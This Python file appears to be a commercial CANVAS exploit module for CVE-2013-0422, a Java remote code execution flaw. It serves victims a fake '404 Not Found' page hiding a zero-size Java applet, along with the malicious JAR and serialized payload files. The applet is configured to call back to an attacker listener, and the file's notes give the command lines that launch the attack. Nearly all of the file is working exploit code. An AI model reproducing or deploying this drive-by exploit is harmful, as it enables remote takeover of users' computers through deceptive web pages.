#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2012
# http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if "." not in sys.path:
    sys.path.append(".")

import os
import canvasengine

from exploitutils import *
from httpclientside import httpclientside

NAME                            = "java_MBeanInstantiator_findClass"
DESCRIPTION                     = "Java MBeanInstantiator.findClass Remote Code Execution" 
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Sun"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "CVE-2013-0422"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0422"
DOCUMENTATION["References"]     = "http://malware.dontneedcoffee.com/2013/01/0-day-17u10-spotted-in-while-disable.html"
DOCUMENTATION["Date public"]    = "01/10/2013"
DOCUMENTATION["Notes"]         = """

Affected versions
JDK and JRE 7 Update 10 and earlier

Tested on:
    - Windows 7 with JDK/JRE 7 update 10

To run from command line, first start the listener (UNIVERSAL):
python commandlineInterface.py -l 192.168.1.10 -p 5555 -v 17

And then run the exploit from clientd:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:java_MBeanInstantiator_findClass -O allowed_recon_modules:js_recon -O auto_detect_exploits:0

"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

TARGETS = { 0 : ["JDK/JRE <= 7 Update 10"]
        }


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "index.html"
        # filename is used in the actual http server
        self.filename           = self.htmlfile
        self.jarfile            = "mbeaninstantiator_findclass.jar"
        self.jarfileName        = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".jar"
        self.serfile            = "mbeaninstantiator_findclass.ser"
        self.serfileName        = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".ser"
        # in standalone mode we want it to adhere
        # to manually chosen callback settings ...
        self.autoFind           = False
        # this exploit can not time out ...
        # it remains active in the browser ...
        self.refresh_rate       = 0
    
    def neededListenerTypes(self):
        if self.HTTPMOSDEF:
            if self.useSSLMOSDEF:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]
    
    # Vulnerability detection
    def is_vulnerable( self, info_dict ):
        major, minor, build, patch = self.getJavaVersions(info_dict)
        self.log("Checking if target is vulnerable. Detected Java version: major=%s, minor=%s, build=%s, patch=%s" % (major, minor, build, patch))
        
        return 81 # REMOVE FOR RELEASE!!! ONLY FOR TESTING!!
    
        if not major:
            # No Java, piss off
            return 0 
        if major == 1:
            if minor == 7:
                if build == 0:
                    if patch <= 10:
                        return 81
                # Detected Java version: major=1,
                # minor=7, build=0, patch=6
        return 0

    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
    
    def run(self):
        self.host       = self.target.interface
        self.htmlfile   = self.argsDict.get('htmlfile', self.htmlfile)
        html            = self.makefile()
        rar             = self.makedownloadfile()
        ser             = self.makeserdownloadfile()
        
        
        self.log("[+] Opening HTML %s for output" % self.htmlfile)
        fd = file(self.htmlfile, 'wb+')
        fd.write(html)
        fd.close()
        self.log("[+] wrote to %s" % self.htmlfile)
        
        self.log("[+] Opening JAR %s for output" % self.jarfile)
        fd = file(self.jarfile, 'wb+')
        fd.write(rar)
        fd.close()
        self.log("[+] Wrote to %s" % self.jarfile)
        
        self.log("[+] Opening SER %s for output" % self.serfile)
        fd = file(self.serfile, 'wb+')
        fd.write(ser)
        fd.close()
        self.log("[+] Wrote to %s" % self.serfile)

        self.log("[+] Place both files together in malicious webroot")        
        return 1

    ## SPIKE Proxy Callbacks ...

    def makedownloadfile(self):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.jarfile), 'rb') as f:
            return f.read()
    
    def makeserdownloadfile(self):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.serfile), 'rb') as f:
            return f.read()
    
    def makefile(self):
            # <!--
            #    <applet archive="%s" code="Main.class" width="0" height="0">
            #        <param name="host" value="%s">
            #        <param name="port" value="%d">
            #        <param name="type" value="%d">
            #        <param name="id" value="%d">
            #        <param name="conn_type" value="%d">
            #        <param name="use_ssl" value="%s">
            #    </applet>
            #-->
        
        html = """
        <html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body>
                <!-- Site 404 Handler Applet -->
                <object classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93" width="0" height="0">
                    <param name="object" value="%s" />
                    <param name="archive" value="%s">
                    <param name="width" value="0"
                    <param name="height" value="0">
                    <param name="host" value="%s">
                    <param name="port" value="%d">
                    <param name="mosdef_type" value="%d">
                    <param name="id" value="%d">
                    <param name="conn_type" value="%d">
                    <param name="use_ssl" value="%s">
                    <comment>
                        <embed object="%s" archive="%s" width="0" height="0" type="application/x-java-applet;version=1.6"
                            host="%s"
                            port="%d"
                            mosdef_type="%d"
                            id="%d"
                            conn_type="%d"
                            use_ssl="%s"
                        >
                        </embed>
                    </comment>
                </object>

                <h1>Not Found</h1>
                <p>The requested URL /%s was not found on this server.</p>
                <hr>
            </body>
        </html>
        """ % (self.serfileName,
               self.jarfileName,
               self.callback.ip,
               self.callback.port,
               self.engine.getMosdefType(canvasengine.JAVASERVER),
               self.engine.getNewMosdefID(self),
               1 if self.HTTPMOSDEF else 0,
               str(self.useSSLMOSDEF).lower(),
               
               self.serfileName,
               self.jarfileName,
               self.callback.ip,
               self.callback.port,
               self.engine.getMosdefType(canvasengine.JAVASERVER),
               self.engine.getNewMosdefID(self),
               1 if self.HTTPMOSDEF else 0,
               str(self.useSSLMOSDEF).lower(),
               
               self.htmlfile) 

        return html
        
    def makesploit(self, clientheader, clientbody):    
        # we are platform independent
        from libs.spkproxy import header, body
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        request = clientheader.URL
        self.log("[+] Requesting: %s" % request)
        self.log("[+] User agent of connecting host: %s" % user_agent)  
        
        if clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())
            
        elif clientheader.URL.count(self.jarfileName):
            self.log("[+] Sending JAR")
            data = self.makedownloadfile()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)
            
        elif clientheader.URL.count(self.serfileName):
            self.log("[+] Sending SER")
            data = self.makeserdownloadfile()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)
            
        elif clientheader.URL.count("done"):
            self.log("Did not load Java applet!")
            return None, None
        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')

        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
